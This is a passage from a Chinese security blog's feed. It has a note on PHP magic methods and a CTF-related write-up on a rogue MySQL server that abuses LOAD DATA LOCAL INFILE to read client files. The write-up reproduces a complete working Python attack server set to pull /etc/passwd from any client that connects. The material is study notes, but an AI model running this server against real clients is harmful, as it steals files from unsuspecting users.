title="参考链接："></a>参考链接：</h1><p><a href="https://mochazz.github.io/2018/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BHDwiki6.0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" target="_blank" rel="noopener">https://mochazz.github.io/2018/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BHDwiki6.0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</a></p><p><a href="https://xz.aliyun.com/t/2087" target="_blank" rel="noopener">https://xz.aliyun.com/t/2087</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP类学习_魔术方法</title>
    <link href="/2019/04/25/PHP%E7%B1%BB%E5%AD%A6%E4%B9%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    <url>/2019/04/25/PHP%E7%B1%BB%E5%AD%A6%E4%B9%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><code>__sleep()</code>:<code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。</p><p><code>__wakeup</code>:<code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用<code>__wakeup</code>方法，预先准备对象需要的资源。</p><p><code>__toString()</code>: <code>__toString()</code> 方法用于一个类被当成字符串时应怎样回应。</p><p><code>__clone()</code>:当复制完成时，如果定义了<code>__clone()</code> 方法，则新创建的对象（复制生成的对象）中的 <code>__clone()</code> 方法会被调用，可用于修改属性的值（如果有必要的话）。</p><h1 id="创建类并实例化"><a href="#创建类并实例化" class="headerlink" title="创建类并实例化"></a>创建类并实例化</h1><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_info</span><span class="hljs-params">($username)</span></span>&#123;<span class="hljs-comment">//从数据库加载用户信息</span>&#125;&#125;$user =<span class="hljs-keyword">new</span> user;$user-&gt;load_info($_GET[<span class="hljs-string">'username'</span>])</code></pre><h1 id="construct"><a href="#construct" class="headerlink" title="__construct"></a><code>__construct</code></h1><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<span class="hljs-keyword">public</span> $username;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($username,$password)</span></span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;validate_user($username,$password))&#123;<span class="hljs-keyword">$this</span>-&gt;username=$username;&#125;&#125;&#125;$user=<span class="hljs-keyword">new</span> user(<span class="hljs-string">'Grif'</span>,<span class="hljs-string">'Misto'</span>);</code></pre><h1 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a><code>__destruct</code></h1><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Database</span></span>&#123;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;db_close(<span class="hljs-keyword">$this</span>-&gt;handle);<span class="hljs-comment">//关闭数据库连接</span>&#125;&#125;</code></pre><h1 id="set-、-get-、-isset-、-unset、"><a href="#set-、-get-、-isset-、-unset、" class="headerlink" title="__set()、__get()、__isset()、__unset、"></a><code>__set()、__get()、__isset()、__unset、</code></h1><p><code>__set()</code>:在给不可访问属性赋值时，<code>__set()</code> 会被调用。</p><p><code>__get()</code>:读取不可访问属性的值时，<code>__get()</code> 会被调用。</p><p><code>__isset()</code>:当对不可访问属性调用 <code>isset()</code> 或 empty() 时，<code>__isset()</code> 会被调用。</p><p><code>__unset</code>:当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用。</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<span class="hljs-keyword">private</span> $__data=<span class="hljs-keyword">array</span>();<span class="hljs-keyword">private</span> $notRead=<span class="hljs-string">'asdasd'</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($property)</span></span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;__data[$property]))&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;__data[$property];&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;&#125;<span class="hljs-comment">//限定只能设置预定义的属性</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span><span class="hljs-params">($property,$value)</span></span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;__data[$property]))&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;__data[$property]=$value;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;&#125;&#125;$johnwood=<span class="hljs-keyword">new</span> Person;$johnwood-&gt;email=<span class="hljs-string">'jonathan@worp.mil'</span>; <span class="hljs-comment">// 设置 $user-&gt;__data['email']</span><span class="hljs-keyword">print</span> $johnwood-&gt;email; <span class="hljs-comment">//读取 $user-&gt;__data['email']</span><span class="hljs-keyword">print</span> $johnwood-&gt;notRead; <span class="hljs-comment">//以定义的属性无法通过__get获取</span></code></pre><p>设置数据时，<code>__set()</code>会重写<code>$__data</code>中的元素。类似地，可以使用<code>__get()</code>拦截调用，并返回正确的数组元素。</p><h1 id="call、-callStatic"><a href="#call、-callStatic" class="headerlink" title="__call、__callStatic"></a><code>__call、__callStatic</code></h1><p><code>__call()</code>:在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。</p><p><code>__callStatic()</code>:静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</p><p>$name 参数是要调用的方法名称。$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数。</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Address</span></span>&#123;<span class="hljs-keyword">protected</span> $city;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setCity</span><span class="hljs-params">($city)</span></span>&#123;<span class="hljs-keyword">$this</span>-&gt;city=$city;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCity</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;city;&#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<span class="hljs-keyword">protected</span> $name;<span class="hljs-keyword">protected</span> $address;<span class="hljs-keyword">protected</span> $method;<span class="hljs-keyword">protected</span> $arguments;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">$this</span>-&gt;address=<span class="hljs-keyword">new</span> Address;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setName</span><span class="hljs-params">($name)</span></span>&#123;<span class="hljs-keyword">$this</span>-&gt;name=$name;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;name;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($method,$arguments)</span></span>&#123;<span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>-&gt;address,$method))&#123;<span class="hljs-comment">// print $method;</span><span class="hljs-comment">// var_dump($arguments);</span><span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;address,$method), $arguments);&#125;&#125;&#125;$rasums=<span class="hljs-keyword">new</span> Person;$rasums-&gt;setName(<span class="hljs-string">'Rasmus Lerdorf'</span>);$rasums-&gt;setCity(<span class="hljs-string">'Sunnyval'</span>);<span class="hljs-keyword">print</span> $rasums-&gt;getName().<span class="hljs-string">'lives in '</span>.$rasums-&gt;getCity().<span class="hljs-string">'.'</span>;</code></pre><p>调用了个<code>Person</code>中不存在的方法，对象调用魔术方法<code>__call()</code></p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span><span class="hljs-params">($args)</span></span>&#123;<span class="hljs-comment">//实际逻辑放在这里</span><span class="hljs-comment">//例如，一个数据库查询</span><span class="hljs-comment">//SELECT user From users where $args['field']=$args['value']</span><span class="hljs-keyword">return</span> <span class="hljs-keyword">print</span> <span class="hljs-string">'get find function Return'</span>;&#125;<span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span><span class="hljs-params">($method,$args)</span></span>&#123;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^findBy(.+)$/'</span>,$method,$matches))&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">static</span>::find(<span class="hljs-keyword">array</span>(<span class="hljs-string">'field'</span>=&gt;$matches[<span class="hljs-number">1</span>],<span class="hljs-string">'value'</span>=&gt;$args[<span class="hljs-number">0</span>]));&#125;&#125;&#125;$user = User::findById(<span class="hljs-number">123</span>);$user=User::findByEmail(<span class="hljs-string">'rasums@php.net'</span>);</code></pre><p>将执行<code>findByEmail</code>方法的实际逻辑传到<code>User::find()</code></p><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallableClass</span> </span><span class="hljs-class"></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span><span class="hljs-params">($x)</span> </span>&#123;        var_dump($x);    &#125;&#125;$obj = <span class="hljs-keyword">new</span> CallableClass;$obj(<span class="hljs-number">5</span>);var_dump(is_callable($obj));</code></pre><h1 id="set-state"><a href="#set-state" class="headerlink" title="__set_state"></a><code>__set_state</code></h1><p>// <code>static __set_state ( array $properties ) : object</code><br>// 自 PHP 5.1.0 起当调用 var_export() 导出类时，此静态 方法会被调用。</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $var1;    <span class="hljs-keyword">public</span> $var2;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set_state</span><span class="hljs-params">($an_array)</span> // <span class="hljs-title">As</span> <span class="hljs-title">of</span> <span class="hljs-title">PHP</span> 5.1.0</span><span class="hljs-function">    </span>&#123;        $obj = <span class="hljs-keyword">new</span> A;        $obj-&gt;var1 = $an_array[<span class="hljs-string">'var1'</span>];        $obj-&gt;var2 = $an_array[<span class="hljs-string">'var2'</span>];        <span class="hljs-keyword">return</span> $obj;    &#125;&#125;$a = <span class="hljs-keyword">new</span> A;$a-&gt;var1 = <span class="hljs-number">5</span>;$a-&gt;var2 = <span class="hljs-string">'foo'</span>;<span class="hljs-keyword">eval</span>(<span class="hljs-string">'$b = '</span> . var_export($a, <span class="hljs-keyword">true</span>) . <span class="hljs-string">';'</span>); <span class="hljs-comment">// $b = A::__set_state(array(</span>                                            <span class="hljs-comment">//    'var1' =&gt; 5,</span>                                            <span class="hljs-comment">//    'var2' =&gt; 'foo',</span>                                            <span class="hljs-comment">// ));</span>var_dump($b);</code></pre><h1 id="debugInfo"><a href="#debugInfo" class="headerlink" title="__debugInfo"></a><code>__debugInfo</code></h1><p><code>__debugInfo （ void ）：数组</code></p><p>// 转储对象以获取应显示的属性时 ，<code>var_dump（）</code>调用此方法。如果未在对象上定义该方法，则将显示所有公共属性，受保护属性和私有属性。</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;    <span class="hljs-keyword">private</span> $prop;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($val)</span> </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;prop = $val;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__debugInfo</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> [            <span class="hljs-string">'propSquared'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;prop ** <span class="hljs-number">2</span>,        ];    &#125;&#125;var_dump(<span class="hljs-keyword">new</span> C(<span class="hljs-number">42</span>));</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>基础笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪mysql服务器_getFile</title>
    <link href="/2019/04/19/%E4%BC%AAmysql%E6%9C%8D%E5%8A%A1%E5%99%A8-getFile/"/>
    <url>/2019/04/19/%E4%BC%AAmysql%E6%9C%8D%E5%8A%A1%E5%99%A8-getFile/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DDCTF中mysql弱口令需要的一个知识点，比赛通道关了，无法复现。这里做个简单的笔记</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>构造伪mysql服务器，根据LOAD DATA INFILE原理，构造特殊Response TABULARW包诱导客户端发送需要的文件。</p><h1 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h1><p>wireshark : <code>port 3306</code><br>终端访问：<code>mysql -uroot -p -h 127.0.0.1</code> // TCP访问</p><p>登录请求包<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><code>select * from users;</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>客户端请求</p><p><code>load local data infile “\etc\passwd” into table test3 fields terminated by ‘\n’;</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>服务端响应客户端<code>Response Query</code>包中却又带有<code>/etc/passwd</code>文件<br>接着客户端响应服务器发送<code>/etc/passwd</code>内容</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>所以只要我们伪造的服务器伪造<code>Response TABULARW</code>包中的文件名，并附上我们指定文件就能得到到文件信息</p><blockquote><p>In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement.”，可以看到，客户端读取哪个文件其实并不是自己说了算的，是服务端说了算的，</p></blockquote><p>不一定需要客户端先发送<code>LOAD DATA LOCAL</code>命令。官方文档解释如下A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL”</p><p>客户端具备的条件：<br>具有CLILENT_LOCAL_FILES属性</p><h1 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h1><ol><li>关闭本地<code>mysql</code>服务器</li></ol><p><code>rogue_mysql_server</code>脚本端口设置多少就是主机mysql连接的端口</p><ol start="2"><li><p>运行脚本<br><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p></li><li><p>终端输入mysql -uroot -p -h 127.0.0.1 -P 3306</p></li></ol><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><ol start="4"><li><code>cat /etc/passwd</code>得到信息<br><img src="./6.png" srcset="/img/loading.gif" alt=""></li></ol><h1 id="具体服务"><a href="#具体服务" class="headerlink" title="具体服务"></a>具体服务</h1><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ntpl</span></code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>#!/usr/bin/env python<br>#coding: utf8</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> asyncore<span class="hljs-keyword">import</span> asynchat<span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> logging<span class="hljs-keyword">import</span> logging.handlersPORT = <span class="hljs-number">3306</span>log = logging.getLogger(__name__)log.setLevel(logging.INFO)tmp_format = logging.handlers.WatchedFileHandler(<span class="hljs-string">'mysql.log'</span>, <span class="hljs-string">'ab'</span>)tmp_format.setFormatter(logging.Formatter(<span class="hljs-string">"%(asctime)s:%(levelname)s:%(message)s"</span>))log.addHandler(    tmp_format)filelist = (    <span class="hljs-string">'/etc/passwd'</span>,)<span class="hljs-comment">#================================================</span><span class="hljs-comment">#=======No need to change after this lines=======</span><span class="hljs-comment">#================================================</span>__author__ = <span class="hljs-string">'Gifts'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">daemonize</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">import</span> os, warnings    <span class="hljs-keyword">if</span> os.name != <span class="hljs-string">'posix'</span>:        warnings.warn(<span class="hljs-string">'Cant create daemon on non-posix system'</span>)        <span class="hljs-keyword">return</span>    <span class="hljs-keyword">if</span> os.fork(): os._exit(<span class="hljs-number">0</span>)    os.setsid()    <span class="hljs-keyword">if</span> os.fork(): os._exit(<span class="hljs-number">0</span>)    os.umask(<span class="hljs-number">0o022</span>)    null=os.open(<span class="hljs-string">'/dev/null'</span>, os.O_RDWR)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):        <span class="hljs-keyword">try</span>:            os.dup2(null, i)        <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">if</span> e.errno != <span class="hljs-number">9</span>: <span class="hljs-keyword">raise</span>    os.close(null)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LastPacket</span><span class="hljs-params">(Exception)</span>:</span>    <span class="hljs-keyword">pass</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutOfOrder</span><span class="hljs-params">(Exception)</span>:</span>    <span class="hljs-keyword">pass</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql_packet</span><span class="hljs-params">(object)</span>:</span>    packet_header = struct.Struct(<span class="hljs-string">'&lt;Hbb'</span>)    packet_header_long = struct.Struct(<span class="hljs-string">'&lt;Hbbb'</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, packet_type, payload)</span>:</span>        <span class="hljs-keyword">if</span> isinstance(packet_type, mysql_packet):            self.packet_num = packet_type.packet_num + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            self.packet_num = packet_type        self.payload = payload    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>        payload_len = len(self.payload)        <span class="hljs-keyword">if</span> payload_len &lt; <span class="hljs-number">65536</span>:            header = mysql_packet.packet_header.pack(payload_len, <span class="hljs-number">0</span>, self.packet_num)        <span class="hljs-keyword">else</span>:            header = mysql_packet.packet_header.pack(payload_len &amp; <span class="hljs-number">0xFFFF</span>, payload_len &gt;&gt; <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, self.packet_num)        result = <span class="hljs-string">"&#123;0&#125;&#123;1&#125;"</span>.format(            header,            self.payload        )        <span class="hljs-keyword">return</span> result    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">return</span> repr(str(self))<span class="hljs-meta">    @staticmethod</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span><span class="hljs-params">(raw_data)</span>:</span>        packet_num = ord(raw_data[<span class="hljs-number">0</span>])        payload = raw_data[<span class="hljs-number">1</span>:]        <span class="hljs-keyword">return</span> mysql_packet(packet_num, payload)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">http_request_handler</span><span class="hljs-params">(asynchat.async_chat)</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, addr)</span>:</span>        asynchat.async_chat.__init__(self, sock=addr[<span class="hljs-number">0</span>])        self.addr = addr[<span class="hljs-number">1</span>]        self.ibuffer = []        self.set_terminator(<span class="hljs-number">3</span>)        self.state = <span class="hljs-string">'LEN'</span>        self.sub_state = <span class="hljs-string">'Auth'</span>        self.logined = <span class="hljs-literal">False</span>        self.push(            mysql_packet(                <span class="hljs-number">0</span>,                <span class="hljs-string">""</span>.join((                    <span class="hljs-string">'\x0a'</span>,  <span class="hljs-comment"># Protocol</span>                    <span class="hljs-string">'5.6.28-0ubuntu0.14.04.1'</span> + <span class="hljs-string">'\0'</span>,                    <span class="hljs-string">'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00'</span>,                ))            )        )        self.order = <span class="hljs-number">1</span>        self.states = [<span class="hljs-string">'LOGIN'</span>, <span class="hljs-string">'CAPS'</span>, <span class="hljs-string">'ANY'</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">push</span><span class="hljs-params">(self, data)</span>:</span>        log.debug(<span class="hljs-string">'Pushed: %r'</span>, data)        data = str(data)        asynchat.async_chat.push(self, data)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">collect_incoming_data</span><span class="hljs-params">(self, data)</span>:</span>        log.debug(<span class="hljs-string">'Data recved: %r'</span>, data)        self.ibuffer.append(data)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">found_terminator</span><span class="hljs-params">(self)</span>:</span>        data = <span class="hljs-string">""</span>.join(self.ibuffer)        self.ibuffer = []        <span class="hljs-keyword">if</span> self.state == <span class="hljs-string">'LEN'</span>:            len_bytes = ord(data[<span class="hljs-number">0</span>]) + <span class="hljs-number">256</span>*ord(data[<span class="hljs-number">1</span>]) + <span class="hljs-number">65536</span>*ord(data[<span class="hljs-number">2</span>]) + <span class="hljs-number">1</span>            <span class="hljs-keyword">if</span> len_bytes &lt; <span class="hljs-number">65536</span>:                self.set_terminator(len_bytes)                self.state = <span class="hljs-string">'Data'</span>            <span class="hljs-keyword">else</span>:                self.state = <span class="hljs-string">'MoreLength'</span>        <span class="hljs-keyword">elif</span> self.state == <span class="hljs-string">'MoreLength'</span>:            <span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>] != <span class="hljs-string">'\0'</span>:                self.push(<span class="hljs-literal">None</span>)                self.close_when_done()            <span class="hljs-keyword">else</span>:                self.state = <span class="hljs-string">'Data'</span>        <span class="hljs-keyword">elif</span> self.state == <span class="hljs-string">'Data'</span>:            packet = mysql_packet.parse(data)            <span class="hljs-keyword">try</span>:                <span class="hljs-keyword">if</span> self.order != packet.packet_num:                    <span class="hljs-keyword">raise</span> OutOfOrder()                <span class="hljs-keyword">else</span>:                    <span class="hljs-comment"># Fix ?</span>                    self.order = packet.packet_num + <span class="hljs-number">2</span>                <span class="hljs-keyword">if</span> packet.packet_num == <span class="hljs-number">0</span>:                    <span class="hljs-keyword">if</span> packet.payload[<span class="hljs-number">0</span>] == <span class="hljs-string">'\x03'</span>:                        log.info(<span class="hljs-string">'Query'</span>)                        filename = random.choice(filelist)                        PACKET = mysql_packet(                            packet,                            <span class="hljs-string">'\xFB&#123;0&#125;'</span>.format(filename)                        )                        self.set_terminator(<span class="hljs-number">3</span>)                        self.state = <span class="hljs-string">'LEN'</span>                        self.sub_state = <span class="hljs-string">'File'</span>                        self.push(PACKET)                    <span class="hljs-keyword">elif</span> packet.payload[<span class="hljs-number">0</span>] == <span class="hljs-string">'\x1b'</span>:                        log.info(<span class="hljs-string">'SelectDB'</span>)                        self.push(mysql_packet(                            packet,                            <span class="hljs-string">'\xfe\x00\x00\x02\x00'</span>                        ))                        <span class="hljs-keyword">raise</span> LastPacket()                    <span class="hljs-keyword">elif</span> packet.payload[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> <span class="hljs-string">'\x02'</span>:                        self.push(mysql_packet(                            packet, <span class="hljs-string">'\0\0\0\x02\0\0\0'</span>                        ))                        <span class="hljs-keyword">raise</span> LastPacket()                    <span class="hljs-keyword">elif</span> packet.payload == <span class="hljs-string">'\x00\x01'</span>:                        self.push(<span class="hljs-literal">None</span>)                        self.close_when_done()                    <span class="hljs-keyword">else</span>:                        <span class="hljs-keyword">raise</span> ValueError()                <span class="hljs-keyword">else</span>:                    <span class="hljs-keyword">if</span> self.sub_state == <span class="hljs-string">'File'</span>:                        log.info(<span class="hljs-string">'-- result'</span>)                        log.info(<span class="hljs-string">'Result: %r'</span>, data)                        <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">1</span>:                            self.push(                                mysql_packet(packet, <span class="hljs-string">'\0\0\0\x02\0\0\0'</span>)                            )                            <span class="hljs-keyword">raise</span> LastPacket()                        <span class="hljs-keyword">else</span>:                            self.set_terminator(<span class="hljs-number">3</span>)                            self.state = <span class="hljs-string">'LEN'</span>                            self.order = packet.packet_num + <span class="hljs-number">1</span>                    <span class="hljs-keyword">elif</span> self.sub_state == <span class="hljs-string">'Auth'</span>:                        self.push(mysql_packet(                            packet, <span class="hljs-string">'\0\0\0\x02\0\0\0'</span>                        ))                        <span class="hljs-keyword">raise</span> LastPacket()                    <span class="hljs-keyword">else</span>:                        log.info(<span class="hljs-string">'-- else'</span>)                        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">'Unknown packet'</span>)            <span class="hljs-keyword">except</span> LastPacket:                log.info(<span class="hljs-string">'Last packet'</span>)                self.state = <span class="hljs-string">'LEN'</span>                self.sub_state = <span class="hljs-literal">None</span>                self.order = <span class="hljs-number">0</span>                self.set_terminator(<span class="hljs-number">3</span>)            <span class="hljs-keyword">except</span> OutOfOrder:                log.warning(<span class="hljs-string">'Out of order'</span>)                self.push(<span class="hljs-literal">None</span>)                self.close_when_done()        <span class="hljs-keyword">else</span>:            log.error(<span class="hljs-string">'Unknown state'</span>)            self.push(<span class="hljs-string">'None'</span>)            self.close_when_done()<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql_listener</span><span class="hljs-params">(asyncore.dispatcher)</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, sock=None)</span>:</span>        asyncore.dispatcher.__init__(self, sock)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sock:            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)            self.set_reuse_addr()            <span class="hljs-keyword">try</span>:                self.bind((<span class="hljs-string">''</span>, PORT))            <span class="hljs-keyword">except</span> socket.error:                exit()            self.listen(<span class="hljs-number">5</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handle_accept</span><span class="hljs-params">(self)</span>:</span>        pair = self.accept()        <span class="hljs-keyword">if</span> pair <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:            log.info(<span class="hljs-string">'Conn from: %r'</span>, pair[<span class="hljs-number">1</span>])            tmp = http_request_handler(pair)z = mysql_listener()<span class="hljs-comment"># daemonize()</span>asyncore.loop()</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a></p><p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p><p><a href="https://dev.mysql.com/doc/internals/en/com-query-response.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/internals/en/com-query-response.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杭州西湖论剑_web题解</title>
    <link href="/2019/04/17/%E6%9D%AD%E5%B7%9E%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/04/17/%E6%9D%AD%E5%B7%9E%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-web%E9%A2%98%E8%A7%A3/</url>
    
